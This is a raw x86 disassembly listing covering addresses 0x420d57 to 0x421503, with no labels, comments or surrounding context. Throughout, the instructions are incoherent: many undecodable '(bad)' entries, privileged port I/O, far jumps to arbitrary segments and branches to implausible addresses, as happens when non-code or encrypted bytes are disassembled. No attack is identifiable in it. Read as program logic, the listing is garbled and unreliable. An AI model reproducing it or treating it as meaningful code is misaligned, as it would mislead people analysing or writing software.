  420d57:	test   eax,0x826f424e
  420d5c:	cmp    BYTE PTR [esi*1-0x8a019de],bl
  420d63:	and    ch,dl
  420d65:	push   0x58
  420d67:	rcl    ah,0x32
  420d6a:	fs lahf 
  420d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d6d:	das    
  420d6e:	push   edx
  420d6f:	or     bh,BYTE PTR [esi+0x51]
  420d72:	(bad)  
  420d73:	lods   eax,DWORD PTR ds:[esi]
  420d74:	and    al,0xa4
  420d76:	and    esp,edx
  420d78:	jmp    0x69ef4b62
  420d7d:	inc    esp
  420d7e:	sar    BYTE PTR [ebx],1
  420d80:	xlat   BYTE PTR ds:[ebx]
  420d81:	je     0x420df2
  420d83:	nop
  420d84:	aam    0xe1
  420d86:	jnp    0x420da7
  420d88:	rol    DWORD PTR ds:0x6b0325a1,1
  420d8e:	mov    bl,BYTE PTR [edi+edi*8-0x3f]
  420d92:	(bad)
  420d96:	mov    dh,0x2b
  420d98:	xor    BYTE PTR [ebx-0x68991c04],0x21
  420d9f:	lds    eax,FWORD PTR [edx+0x54]
  420da2:	cdq    
  420da3:	add    DWORD PTR [ecx-0xe8012ca],esi
  420da9:	sahf   
  420daa:	retf   
  420dab:	or     edi,ebx
  420dad:	ret    0xbcc8
  420db0:	int    0xc6
  420db2:	mov    ebx,esi
  420db4:	dec    ebp
  420db5:	xor    ebx,eax
  420db7:	pop    ebx
  420db8:	clc    
  420db9:	(bad)  
  420dba:	out    0x28,eax
  420dbc:	xchg   ebp,eax
  420dbd:	out    0x5,al
  420dbf:	xchg   BYTE PTR [ebx+eax*8+0x60],dl
  420dc3:	sbb    eax,0xca778558
  420dc8:	sbb    ah,dl
  420dca:	cdq    
  420dcb:	pop    ebx
  420dcc:	jb     0x420d5b
  420dce:	loope  0x420d62
  420dd0:	add    eax,0xa49158e
  420dd5:	in     eax,0xf2
  420dd7:	stos   DWORD PTR es:[edi],eax
  420dd8:	stos   DWORD PTR es:[edi],eax
  420dd9:	dec    ebx
  420dda:	pusha  
  420ddb:	div    dh
  420ddd:	fwait
  420dde:	and    eax,0xcfacba03
  420de3:	out    0xac,eax
  420de5:	into   
  420de6:	pop    edx
  420de7:	or     edx,DWORD PTR [esi-0x6ae12cba]
  420ded:	idiv   DWORD PTR [edi+0x18]
  420df0:	stc    
  420df1:	sub    al,0x3e
  420df3:	jo     0x420dba
  420df5:	je     0x420de9
  420df7:	repz std 
  420df9:	(bad)  
  420dfa:	jns    0x420e22
  420dfc:	adc    al,0x26
  420dfe:	fidiv  DWORD PTR [ebx]
  420e00:	jl     0x420e5b
  420e02:	and    ecx,DWORD PTR [esi+0x2e]
  420e05:	cmp    DWORD PTR [ebp-0x61],ebp
  420e08:	add    DWORD PTR [ecx+edi*1+0x2b],edi
  420e0c:	jmp    0x420e65
  420e0e:	inc    edx
  420e0f:	aad    0x57
  420e11:	fsub   st,st(7)
  420e13:	add    dl,bh
  420e15:	xchg   ebp,ebx
  420e17:	xlat   BYTE PTR ds:[ebx]
  420e18:	pop    edi
  420e19:	mov    ecx,0xc94970e2
  420e1e:	xor    ch,dh
  420e20:	ret    0x1503
  420e23:	test   al,0x6
  420e25:	popf   
  420e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e27:	mov    eax,0x468af875
  420e2c:	and    al,0xb4
  420e2e:	fsubr  DWORD PTR [edx+0x70]
  420e31:	popa   
  420e32:	push   ds
  420e33:	mov    ds:0xb95d336,eax
  420e38:	dec    edx
  420e39:	pop    eax
  420e3a:	stos   DWORD PTR es:[edi],eax
  420e3b:	outs   dx,DWORD PTR ds:[esi]
  420e3c:	rol    DWORD PTR [edi-0x37c7cdcd],0xa5
  420e43:	jge    0x420df6
  420e45:	mov    esp,es
  420e47:	mov    dl,0x6f
  420e49:	(bad)  
  420e4a:	jmp    FWORD PTR [esi+0x86c5ae5]
  420e50:	in     al,dx
  420e51:	rcr    DWORD PTR [edx],0xe6
  420e54:	xchg   ebx,eax
  420e55:	cmp    edi,edx
  420e57:	std    
  420e58:	nop
  420e59:	arpl   WORD PTR [ecx+0x2a],ax
  420e5c:	push   0xffffffd0
  420e5e:	iret   
  420e5f:	add    eax,0x5ac07d3
  420e64:	iret   
  420e65:	fsub   QWORD PTR [ecx+ecx*1+0x19b3a42b]
  420e6c:	out    dx,eax
  420e6d:	ret    
  420e6e:	clc    
  420e6f:	leave  
  420e70:	cdq    
  420e71:	fwait
  420e72:	ds jo  0x420dfa
  420e75:	rcl    dl,cl
  420e77:	or     eax,esi
  420e79:	rol    DWORD PTR [ecx],0x32
  420e7c:	adc    DWORD PTR [esi+0x1aa48c55],0x5b860fd1
  420e86:	inc    eax
  420e87:	ja     0x420e61
  420e89:	arpl   WORD PTR [ecx-0x3117fb42],cx
  420e8f:	jl     0x420e63
  420e91:	inc    edx
  420e92:	out    dx,eax
  420e93:	xchg   edx,eax
  420e94:	xchg   ebx,eax
  420e95:	mov    ah,0xb0
  420e97:	shl    DWORD PTR [esi],cl
  420e99:	push   edi
  420e9a:	add    dl,al
  420e9c:	push   ebx
  420e9d:	in     al,0x1f
  420e9f:	rcr    BYTE PTR [ebp+0x1ef28063],cl
  420ea5:	and    ah,BYTE PTR [edx]
  420ea7:	popa   
  420ea8:	xchg   edx,eax
  420ea9:	dec    edx
  420eaa:	jmp    0x420e5c
  420eac:	mov    al,0xcd
  420eae:	shl    edi,cl
  420eb0:	add    al,0xd8
  420eb2:	inc    edi
  420eb3:	clc    
  420eb4:	mov    esp,0x49d3d805
  420eb9:	xor    BYTE PTR [ebx],dl
  420ebb:	das    
  420ebc:	cmp    esp,DWORD PTR [ebx+0x7c]
  420ebf:	loope  0x420edd
  420ec1:	inc    ebx
  420ec2:	push   esp
  420ec3:	fimul  WORD PTR [esi]
  420ec5:	inc    esp
  420ec6:	or     esi,ebp
  420ec8:	(bad)  
  420ec9:	call   DWORD PTR [ecx-0x29]
  420ecc:	int    0xd7
  420ece:	jecxz  0x420ee1
  420ed0:	pop    ebp
  420ed1:	loopne 0x420e94
  420ed3:	(bad)  
  420ed4:	outs   dx,DWORD PTR ds:[esi]
  420ed5:	xchg   esi,eax
  420ed6:	(bad)  
  420ed7:	xchg   ebx,eax
  420ed8:	out    0x96,eax
  420eda:	mov    ah,0x2a
  420edc:	dec    edx
  420edd:	aaa    
  420ede:	popf   
  420edf:	inc    ebp
  420ee0:	out    0x43,al
  420ee2:	sbb    dh,BYTE PTR [ecx-0x7d]
  420ee5:	mul    DWORD PTR [edi+esi*4+0x685b086]
  420eec:	fsub   st(6),st
  420eee:	out    dx,al
  420eef:	sub    al,0x1d
  420ef1:	adc    BYTE PTR [edi],ch
  420ef3:	int3   
  420ef4:	and    bl,BYTE PTR [eax+0x2c75f7e8]
  420efa:	inc    edi
  420efb:	add    esp,ebx
  420efd:	sbb    DWORD PTR [esi-0x9406c2e],esp
  420f03:	adc    al,0x75
  420f05:	jno    0x420f1b
  420f07:	cmc    
  420f08:	in     al,0xc6
  420f0a:	(bad)  
  420f0b:	sar    BYTE PTR [ecx-0x1f],0xc9
  420f0f:	pop    esp
  420f10:	arpl   di,ax
  420f12:	mov    esi,0x7051f803
  420f17:	sub    eax,0xf33107a0
  420f1c:	sbb    al,0x13
  420f1e:	and    ecx,eax
  420f20:	(bad)  
  420f21:	jmp    0x4adfcb00
  420f26:	pop    ebx
  420f27:	push   edx
  420f28:	int    0xa6
  420f2a:	and    dh,BYTE PTR [edi+0x7f]
  420f2d:	ss jp  0x420f64
  420f30:	jge    0x420f2c
  420f32:	sbb    ah,ah
  420f34:	cmp    al,BYTE PTR [edx+edx*1-0x42]
  420f38:	loop   0x420f47
  420f3a:	test   DWORD PTR [ebx+0x2e50a742],0x7b67d312
  420f44:	retf   
  420f45:	mov    WORD PTR [ebx],fs
  420f47:	aad    0xa4
  420f49:	or     BYTE PTR [edi],bl
  420f4b:	out    0x65,al
  420f4d:	les    ebx,FWORD PTR [ecx]
  420f4f:	loop   0x420f9d
  420f51:	sbb    DWORD PTR fs:[edx],esp
  420f54:	shl    DWORD PTR [eax],0xb8
  420f57:	mov    ah,0xa5
  420f59:	ins    BYTE PTR es:[edi],dx
  420f5a:	add    eax,0xbd909678
  420f5f:	sbb    edx,DWORD PTR [edi+ecx*8]
  420f62:	adc    al,0x1f
  420f64:	mov    ebx,0x1c247e1a
  420f69:	pop    DWORD PTR [ebx+0x46]
  420f6c:	push   esi
  420f6d:	push   cs
  420f6e:	or     al,dh
  420f70:	sub    DWORD PTR [ebx+0x7277d376],esp
  420f76:	inc    esp
  420f77:	icebp  
  420f78:	jmp    0x420f35
  420f7a:	mov    ebx,0x2d9c38ff
  420f7f:	in     al,dx
  420f80:	cli    
  420f81:	imul   eax,eax,0xffffffa8
  420f84:	mov    esi,0x7966f952
  420f89:	stos   DWORD PTR es:[edi],eax
  420f8a:	aaa    
  420f8b:	push   ss
  420f8c:	pop    eax
  420f8d:	test   DWORD PTR [edx+0x7c93db81],ecx
  420f93:	jno    0x420fe7
  420f95:	call   0x45663ade
  420f9a:	loope  0x421001
  420f9c:	shl    BYTE PTR [ebx+0x3191b8f9],1
  420fa2:	(bad)  
  420fa3:	mov    ebx,0x9cb01093
  420fa8:	(bad)  
  420fa9:	push   edi
  420faa:	cld    
  420fab:	out    0xf1,al
  420fad:	lods   al,BYTE PTR ds:[esi]
  420fae:	(bad)  
  420faf:	mov    WORD PTR [eax-0x2c2a3b06],fs
  420fb5:	xchg   esi,eax
  420fb6:	call   0x3660719a
  420fbb:	test   DWORD PTR [esi+0x3fcbe4d9],esp
  420fc1:	icebp  
  420fc2:	shr    DWORD PTR [ebx-0x49ea3f63],0xf2
  420fc9:	dec    esp
  420fca:	pusha  
  420fcb:	shr    BYTE PTR [esi],cl
  420fcd:	and    DWORD PTR [ecx-0x5c],ebp
  420fd0:	sbb    DWORD PTR [ecx+0x58],0xf
  420fd4:	das    
  420fd5:	cdq    
  420fd6:	int3   
  420fd7:	xor    al,0x45
  420fd9:	fs ins DWORD PTR es:[edi],dx
  420fdb:	and    dl,ah
  420fdd:	inc    eax
  420fde:	stos   DWORD PTR es:[edi],eax
  420fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fe0:	ins    BYTE PTR es:[edi],dx
  420fe1:	retf   
  420fe2:	(bad)  
  420fe3:	mov    al,0x49
  420fe5:	dec    esi
  420fe6:	adc    edi,DWORD PTR [ebx+0x58]
  420fe9:	out    dx,eax
  420fea:	or     BYTE PTR [edx+0x73],0x25
  420fee:	pop    ecx
  420fef:	sub    ebp,edx
  420ff1:	push   ecx
  420ff2:	adc    al,0x61
  420ff4:	mul    DWORD PTR [eax-0x4c2fa1cc]
  420ffa:	inc    eax
  420ffb:	xchg   ebp,eax
  420ffc:	xchg   al,cl
  420ffe:	sahf   
  420fff:	loop   0x420fb9
  421001:	pop    ebx
  421002:	mov    dl,0xe8
  421004:	adc    ah,BYTE PTR [ecx+0x703864cf]
  42100a:	hlt    
  42100b:	dec    eax
  42100c:	sbb    eax,0xef4f1b8f
  421011:	sbb    al,dh
  421013:	(bad)  
  421014:	pop    ebp
  421015:	jae    0x420fe9
  421017:	cmc    
  421018:	mov    eax,0x9e38736e
  42101d:	int3   
  42101e:	add    ebx,eax
  421020:	popf   
  421021:	adc    bh,BYTE PTR [esi-0x4e6fc04b]
  421027:	into   
  421028:	push   esi
  421029:	adc    BYTE PTR [edx+0x56d9d504],al
  42102f:	ins    BYTE PTR es:[edi],dx
  421030:	sbb    bl,BYTE PTR [edi+0x53]
  421033:	xor    BYTE PTR [esi+0x4f9c781b],ch
  421039:	xor    BYTE PTR [edx-0x4108c025],bh
  42103f:	mov    DWORD PTR [ebp-0x23],edi
  421042:	cmp    al,0xfe
  421044:	cwde   
  421045:	xor    al,0x3c
  421047:	sbb    bl,BYTE PTR [ebp+0x725cae8f]
  42104d:	push   0xffffffb8
  42104f:	mov    WORD PTR [esi+0x4a07c94e],?
  421055:	jmp    0x56398609
  42105a:	aaa    
  42105b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42105c:	cmc    
  42105d:	daa    
  42105e:	adc    ebx,DWORD PTR [edx-0x69]
  421061:	dec    ebp
  421062:	and    BYTE PTR [edx+0x7d],0x65
  421066:	pusha  
  421067:	dec    edx
  421068:	pop    esi
  421069:	cmp    eax,0xc5755a8
  42106e:	cmp    eax,0x81879b6
  421073:	iret   
  421074:	test   ebx,ebx
  421076:	xlat   BYTE PTR ds:[ebx]
  421077:	sar    ah,cl
  421079:	pop    edi
  42107a:	jg     0x421084
  42107c:	js     0x42101e
  42107e:	fsubrp st(5),st
  421080:	jle    0x4210ec
  421082:	jle    0x4210d4
  421084:	jecxz  0x42100c
  421086:	clc    
  421087:	inc    ebp
  421088:	sub    edx,DWORD PTR [ecx+0x54]
  42108b:	or     ax,0x56f
  42108f:	mov    eax,0xd1548d86
  421094:	jae    0x4210e5
  421096:	sbb    ah,BYTE PTR [ebx+eiz*4]
  421099:	stc    
  42109a:	and    esp,edx
  42109c:	inc    esp
  42109d:	sub    eax,DWORD PTR [edx-0x51]
  4210a0:	jmp    0xc116:0x45bb118e
  4210a7:	jle    0x4210fd
  4210a9:	dec    esp
  4210aa:	cdq    
  4210ab:	ins    BYTE PTR es:[edi],dx
  4210ac:	fld    QWORD PTR [edi-0x4e62e35d]
  4210b2:	xchg   BYTE PTR [edi],ah
  4210b4:	pop    es
  4210b5:	xchg   BYTE PTR [ecx+edi*8+0xa6c227a],dh
  4210bc:	ins    BYTE PTR es:[edi],dx
  4210bd:	lock shl bl,cl
  4210c0:	xor    DWORD PTR [edi-0x14],edi
  4210c3:	cmp    DWORD PTR [ebx],edx
  4210c5:	ror    bh,1
  4210c7:	cmp    eax,ecx
  4210c9:	mov    ch,0x9a
  4210cb:	mov    BYTE PTR [bp+di],bl
  4210ce:	shl    DWORD PTR [esi],1
  4210d0:	outs   dx,DWORD PTR ds:[esi]
  4210d1:	adc    DWORD PTR [eax-0x3b],ebp
  4210d4:	fnstsw WORD PTR [edi+0x3531a141]
  4210da:	test   ecx,esi
  4210dc:	mov    ecx,0x216b09ff
  4210e1:	inc    ebx
  4210e2:	sbb    eax,0x8eed56d3
  4210e7:	jb     0x4210dd
  4210e9:	dec    ecx
  4210ea:	or     eax,0xb43d3b04
  4210ef:	jns    0x421104
  4210f1:	push   esi
  4210f2:	cmp    DWORD PTR [ebx+0x696507a6],ecx
  4210f8:	cld    
  4210f9:	rcl    BYTE PTR [edi+0xf4da686],cl
  4210ff:	fcomp  DWORD PTR [ecx+0x50]
  421102:	jae    0x421172
  421104:	sub    al,bh
  421106:	popf   
  421107:	ins    DWORD PTR es:[edi],dx
  421108:	jmp    0x9cd43e4
  42110d:	stos   DWORD PTR es:[edi],eax
  42110e:	icebp  
  42110f:	shr    BYTE PTR [ebp+0x3cb92e26],1
  421115:	ins    DWORD PTR es:[edi],dx
  421116:	adc    eax,0xa6bdd95a
  42111b:	jg     0x421156
  42111d:	dec    edx
  42111e:	retf   
  42111f:	iret   
  421120:	lods   al,BYTE PTR ds:[esi]
  421121:	pop    ebx
  421122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421123:	ror    eax,1
  421125:	dec    ebp
  421126:	pop    esp
  421127:	add    al,0x29
  421129:	and    BYTE PTR [ebx],bl
  42112b:	cmc    
  42112c:	shl    BYTE PTR [eax-0x26364c5e],1
  421132:	xchg   edi,eax
  421133:	mov    esp,0xc58fa881
  421138:	shl    BYTE PTR [ebp+0x64],1
  42113b:	imul   esp,DWORD PTR [edi+0x755a3d3e],0xc
  421142:	ins    BYTE PTR es:[edi],dx
  421143:	lock adc cl,BYTE PTR [esp+eax*1-0x5ee7df2d]
  42114b:	in     eax,0x14
  42114d:	xor    eax,0x8e19da0c
  421152:	dec    ecx
  421153:	loop   0x421184
  421155:	pop    ecx
  421156:	mov    esi,0x4f91ac28
  42115b:	and    cl,BYTE PTR [edx+0x43f7f804]
  421161:	xchg   DWORD PTR [edx+0x55042557],esi
  421167:	call   0x6264:0xc1479f7d
  42116e:	das    
  42116f:	pusha  
  421170:	sub    edi,DWORD PTR [ebx]
  421172:	pop    edi
  421173:	jmp    0x52fa7723
  421178:	cdq    
  421179:	mov    WORD PTR [edi],gs
  42117b:	outs   dx,BYTE PTR ds:[esi]
  42117c:	ror    ah,1
  42117e:	pop    ecx
  42117f:	clc    
  421180:	push   esp
  421181:	sub    BYTE PTR [edx],cl
  421183:	add    BYTE PTR [ecx+0x212f89bf],dh
  421189:	sbb    dh,bl
  42118b:	sub    bh,BYTE PTR [esp+esi*8+0x4afe8a47]
  421192:	jp     0x4211b1
  421194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421195:	push   0xffffffa4
  421197:	cmp    ah,BYTE PTR [edi]
  421199:	push   ecx
  42119a:	mov    eax,0xc269a0af
  42119f:	pop    ecx
  4211a0:	aas    
  4211a1:	xlat   BYTE PTR ds:[ebx]
  4211a2:	mov    cl,0xd6
  4211a4:	pop    ecx
  4211a5:	and    BYTE PTR [ebx],0xb9
  4211a8:	dec    ebx
  4211a9:	stc    
  4211aa:	xor    al,0x62
  4211ac:	and    BYTE PTR cs:[eax-0x3d],ch
  4211b0:	pop    ds
  4211b1:	cmp    ecx,DWORD PTR [ecx-0x6a]
  4211b4:	ja     0x4211b2
  4211b6:	dec    edi
  4211b7:	jne    0x42116d
  4211b9:	xchg   esi,eax
  4211ba:	mov    dh,0x8f
  4211bc:	aam    0x8c
  4211be:	int3   
  4211bf:	out    0xba,eax
  4211c1:	sbb    ch,0x2b
  4211c4:	leave  
  4211c5:	inc    edx
  4211c6:	jns    0x421171
  4211c8:	ret    0x92fb
  4211cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211cc:	jns    0x42122c
  4211ce:	push   0xca7606de
  4211d3:	fdiv   st,st(2)
  4211d5:	inc    eax
  4211d6:	pop    ebp
  4211d7:	xchg   edi,eax
  4211d8:	cmp    edx,DWORD PTR [edx-0x4367da9a]
  4211de:	pop    ebx
  4211df:	mov    ebp,0x72ac51ec
  4211e4:	popa   
  4211e5:	aad    0x45
  4211e7:	xchg   DWORD PTR [eax-0x4a],edi
  4211ea:	fwait
  4211eb:	and    DWORD PTR [esp+edx*8],0x6581e4b3
  4211f2:	fisttp WORD PTR [esi-0x7e9fbdc3]
  4211f8:	xchg   edx,eax
  4211f9:	add    ebp,esi
  4211fb:	inc    esi
  4211fc:	adc    ebp,eax
  4211fe:	cmp    DWORD PTR [edi+0x27e746b],0xb5e0a9fe
  421208:	dec    edi
  421209:	adc    eax,0x826de258
  42120e:	adc    al,0xd3
  421210:	xchg   ebx,eax
  421211:	test   BYTE PTR [esi-0x3c2ffea2],dh
  421217:	mov    bl,0x36
  421219:	push   cs
  42121a:	gs ins BYTE PTR es:[di],dx
  42121d:	lea    ebp,[edi+0x5c6c30b7]
  421223:	call   0xd0d210e9
  421228:	stos   BYTE PTR es:[edi],al
  421229:	stos   DWORD PTR es:[edi],eax
  42122a:	popf   
  42122b:	addr16 aas 
  42122d:	addr16 inc ecx
  42122f:	jne    0x42123e
  421231:	push   ss
  421232:	lds    esi,FWORD PTR [ebp+0x48]
  421235:	outs   dx,BYTE PTR ds:[esi]
  421236:	xchg   ebp,eax
  421237:	add    eax,0xe8632d30
  42123c:	pop    ss
  42123d:	xlat   BYTE PTR ds:[ebx]
  42123e:	add    cl,BYTE PTR [ecx-0x6]
  421241:	pop    ebp
  421242:	xchg   ecx,eax
  421243:	ins    BYTE PTR es:[edi],dx
  421244:	(bad)  
  421245:	aam    0x8b
  421247:	retf   0x1e99
  42124a:	jle    0x4211d5
  42124c:	lods   al,BYTE PTR ds:[esi]
  42124d:	loop   0x4212a7
  42124f:	xchg   edx,eax
  421250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421251:	fiadd  WORD PTR [eax+ebp*2]
  421254:	loopne 0x421260
  421256:	sar    DWORD PTR [ebx],1
  421258:	pop    ds
  421259:	cmp    al,0x5c
  42125b:	into   
  42125c:	ret    
  42125d:	push   0xa8b882d
  421262:	add    DWORD PTR [edx-0x36d0141],ebp
  421268:	sar    DWORD PTR [eax+0x72],1
  42126b:	sbb    ch,ch
  42126d:	stos   DWORD PTR es:[edi],eax
  42126e:	inc    ebx
  42126f:	ss inc eax
  421271:	jmp    0x421261
  421273:	fsubr  st(4),st
  421275:	mov    bh,0xe5
  421277:	inc    edi
  421278:	lods   eax,DWORD PTR ds:[esi]
  421279:	mov    al,ds:0xb8dbacca
  42127e:	cmp    edx,DWORD PTR [eax+0x7c]
  421281:	aas    
  421282:	and    DWORD PTR ds:0x2aa7e399,ebx
  421288:	test   eax,0x620625ae
  42128d:	sbb    eax,0x63728d87
  421292:	or     eax,0x579e9fd1
  421297:	xchg   esi,eax
  421298:	inc    edi
  421299:	outs   dx,BYTE PTR ds:[esi]
  42129a:	add    eax,0xfce09d58
  42129f:	fs cs into 
  4212a2:	ja     0x4212e6
  4212a4:	push   edi
  4212a5:	or     eax,0x2d3d3dd5
  4212aa:	fstp   DWORD PTR [esi+0x686676f5]
  4212b0:	pop    edi
  4212b1:	cwde   
  4212b2:	das    
  4212b3:	sub    al,0x46
  4212b5:	ins    DWORD PTR es:[edi],dx
  4212b6:	jp     0x421252
  4212b8:	xor    al,0x50
  4212ba:	adc    cl,dl
  4212bc:	jnp    0x421248
  4212be:	xchg   ebx,eax
  4212bf:	js     0x42132e
  4212c1:	push   es
  4212c2:	inc    edi
  4212c3:	fdiv   DWORD PTR [ebx-0xf]
  4212c6:	pop    eax
  4212c7:	iret   
  4212c8:	adc    eax,eax
  4212ca:	mov    ss,WORD PTR [ebp-0x2b]
  4212cd:	push   cs
  4212ce:	test   DWORD PTR [ebx],0x5e1c2f1f
  4212d4:	push   ebp
  4212d5:	addr16 rol ch,0xd5
  4212d9:	in     eax,0x48
  4212db:	jae    0x4212ca
  4212dd:	xlat   BYTE PTR ds:[ebx]
  4212de:	mov    ebp,0x6f3d15e3
  4212e3:	cmc    
  4212e4:	xchg   ebx,eax
  4212e5:	in     al,dx
  4212e6:	fwait
  4212e7:	inc    esp
  4212e8:	retf   0xedac
  4212eb:	retf   0x68b3
  4212ee:	xor    edx,edi
  4212f0:	or     edi,DWORD PTR [eax-0x1d]
  4212f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212f4:	cmp    DWORD PTR [edx+edx*8+0x3af2449d],ecx
  4212fb:	xchg   esi,eax
  4212fc:	or     eax,0x3156cda3
  421301:	pop    es
  421302:	repz fdiv QWORD PTR [esp+ebx*1-0x44]
  421307:	inc    edi
  421308:	ds xor eax,0x98b71d50
  42130e:	fcom   DWORD PTR [ecx+eiz*2-0x1f]
  421312:	test   eax,0xa95cd513
  421317:	std    
  421318:	mov    dl,BYTE PTR [ecx+0x5c]
  42131b:	adc    eax,0xdd91c835
  421320:	mov    ebx,0x70b732e2
  421325:	dec    ecx
  421326:	xor    DWORD PTR [edx],ecx
  421328:	mov    WORD PTR es:[edx-0x642a047a],gs
  42132f:	mov    ds:0xfd52b26f,eax
  421334:	lock fs xchg esi,eax
  421337:	and    al,0xb7
  421339:	xchg   BYTE PTR [edi-0x5739b758],cl
  42133f:	out    0x23,eax
  421341:	mov    edi,0x45443c9f
  421346:	es and edx,eax
  421349:	push   eax
  42134a:	pop    eax
  42134b:	mov    al,ds:0xef6b9d51
  421350:	cmc    
  421351:	call   0xfbe3:0x28823d6e
  421358:	imul   ebx,DWORD PTR [esi-0x7a423c4f],0x42
  42135f:	test   ebp,ecx
  421361:	adc    al,0x74
  421363:	add    esp,DWORD PTR [ebp-0x13]
  421366:	pop    ds
  421367:	adc    DWORD PTR [ebp+0x43],edx
  42136a:	inc    ebp
  42136b:	in     al,0xf0
  42136d:	dec    ecx
  42136e:	hlt    
  42136f:	push   ecx
  421370:	loope  0x42134f
  421372:	xchg   esi,eax
  421373:	inc    eax
  421374:	scas   eax,DWORD PTR es:[edi]
  421375:	rcl    DWORD PTR [ebx],1
  421377:	outs   dx,DWORD PTR ds:[esi]
  421378:	mov    ecx,0x5e26c90c
  42137d:	aam    0xd5
  42137f:	les    ebp,FWORD PTR [ecx+0x2a10bb59]
  421385:	sub    al,BYTE PTR [edi-0x5a148d12]
  42138b:	dec    edx
  42138c:	add    ecx,DWORD PTR [eax]
  42138e:	jnp    0x421399
  421390:	pop    esi
  421391:	adc    eax,0xca3af789
  421396:	lods   eax,DWORD PTR ds:[esi]
  421397:	inc    edx
  421398:	shl    cl,0xeb
  42139b:	push   ecx
  42139c:	or     edx,DWORD PTR [edx+0x37a504b0]
  4213a2:	dec    eax
  4213a3:	inc    edx
  4213a4:	jl     0x4213a3
  4213a6:	cs sti 
  4213a8:	dec    esi
  4213a9:	and    DWORD PTR [ecx-0xd2facca],0xffffffdc
  4213b0:	push   es
  4213b1:	(bad)  
  4213b2:	fcos   
  4213b4:	adc    BYTE PTR [ecx+0x467f2eeb],bh
  4213ba:	mov    eax,0x33cb26d6
  4213bf:	inc    ecx
  4213c0:	push   ds
  4213c1:	pusha  
  4213c2:	sub    DWORD PTR [ecx],0x41
  4213c5:	xchg   edi,eax
  4213c6:	pusha  
  4213c7:	int    0xba
  4213c9:	mov    esi,0x7b6da661
  4213ce:	inc    ebx
  4213cf:	dec    edx
  4213d0:	pop    edi
  4213d1:	adc    DWORD PTR [edi+0x16fbe4a4],ecx
  4213d7:	add    eax,0xd9289f34
  4213dc:	loop   0x421404
  4213de:	in     al,0x88
  4213e0:	xchg   DWORD PTR [esi+0x5c],edi
  4213e3:	jmp    FWORD PTR [ebx-0x6e]
  4213e6:	dec    edx
  4213e7:	adc    DWORD PTR [esi+ecx*4-0x2f1ca5db],edx
  4213ee:	mov    BYTE PTR [bp+di+0x6503],cl
  4213f3:	add    al,0x93
  4213f5:	xor    BYTE PTR [edx+0x8],dl
  4213f8:	ja     0x421434
  4213fa:	lods   eax,DWORD PTR ds:[esi]
  4213fb:	test   BYTE PTR [ebx+0x32],cl
  4213fe:	repnz mov esp,0x3b85f628
  421404:	ret    
  421405:	cld    
  421406:	clc    
  421407:	xor    al,0xb8
  421409:	and    DWORD PTR [edi-0x736af735],ecx
  42140f:	inc    BYTE PTR [eax-0x35]
  421412:	jecxz  0x4213f9
  421414:	fwait
  421415:	add    al,0x12
  421417:	test   DWORD PTR [esi+0x3f],edi
  42141a:	ss pushf 
  42141c:	dec    esp
  42141d:	mov    ebp,esp
  42141f:	cwde   
  421420:	enter  0xcf77,0xc8
  421424:	mov    al,BYTE PTR [eax]
  421426:	or     bh,bh
  421428:	sbb    eax,0x91a8cb3d
  42142d:	loope  0x421422
  42142f:	lds    esi,FWORD PTR [ecx]
  421431:	sbb    eax,0x692a87cb
  421436:	push   cs
  421437:	pop    edi
  421438:	(bad)  
  421439:	mov    ebx,0x2746339b
  42143e:	xchg   edx,eax
  42143f:	ror    BYTE PTR [edx+edx*8],cl
  421442:	push   ebp
  421443:	ja     0x421408
  421445:	and    eax,DWORD PTR [eax+0x20]
  421448:	retf   0xc514
  42144b:	mov    WORD PTR [eax+0x264e132b],gs
  421451:	cld    
  421452:	sbb    edi,ebp
  421454:	(bad)  
  421455:	imul   ebp,esp,0x20
  421458:	test   BYTE PTR [esi+eax*2],al
  42145b:	ret    
  42145c:	cwde   
  42145d:	adc    bl,cl
  42145f:	fld    TBYTE PTR [ebp+0x469792e]
  421465:	pop    edi
  421466:	ficomp WORD PTR [eax-0x185df41f]
  42146c:	jae    0x42146d
  42146e:	mov    esi,0x329f99fc
  421473:	shr    DWORD PTR [ecx+0x20],0x3d
  421477:	pop    ss
  421478:	jl     0x421431
  42147a:	popf   
  42147b:	fisttp WORD PTR [edi-0x119b6e75]
  421481:	sbb    ch,BYTE PTR [esi+eax*4+0x78]
  421485:	fsub   QWORD PTR [ebp-0x1fb73d7a]
  42148b:	shr    DWORD PTR [edi],0x42
  42148e:	shl    DWORD PTR [edx+0x4b],1
  421491:	push   ds
  421492:	int    0xec
  421494:	pop    edi
  421495:	sbb    DWORD PTR [eax+0x250ac9f3],esp
  42149b:	loopne 0x42148f
  42149d:	dec    esp
  42149e:	jnp    0x42147a
  4214a0:	outs   dx,BYTE PTR ds:[esi]
  4214a1:	cwde   
  4214a2:	test   eax,0xe594301a
  4214a7:	add    DWORD PTR [ecx+0x7249aeea],ebx
  4214ad:	(bad)  [ebp+eax*1-0x40ecab66]
  4214b4:	xchg   edi,eax
  4214b5:	cli    
  4214b6:	pop    ss
  4214b7:	ror    BYTE PTR [ecx-0x32],cl
  4214ba:	cmc    
  4214bb:	xchg   ecx,eax
  4214bc:	push   ecx
  4214bd:	jno    0x42144d
  4214bf:	inc    esp
  4214c0:	in     al,dx
  4214c1:	mov    esi,0x8054c9a0
  4214c6:	or     al,dh
  4214c8:	mov    ds:0x9aff547,al
  4214cd:	mov    al,0x15
  4214cf:	das    
  4214d0:	cmp    eax,0x2e97ad7b
  4214d5:	mov    WORD PTR [edi+ebx*4+0x4],ss
  4214d9:	outs   dx,BYTE PTR ds:[esi]
  4214da:	das    
  4214db:	jl     0x4214fc
  4214dd:	aam    0xf
  4214df:	adc    eax,0x2c579dfa
  4214e4:	repnz shl BYTE PTR [edi+edi*4+0x2041a1e4],1
  4214ec:	sbb    eax,0xfbbe6d5a
  4214f1:	nop
  4214f2:	and    ch,BYTE PTR [ebx-0x91858a7]
  4214f8:	mov    DWORD PTR [edi],edx
  4214fa:	ins    DWORD PTR es:[edi],dx
  4214fb:	and    bh,BYTE PTR [ebp+0xf]
  4214fe:	jmp    0xc041e59b
  421503:	cmp    eax,0x3d940f31
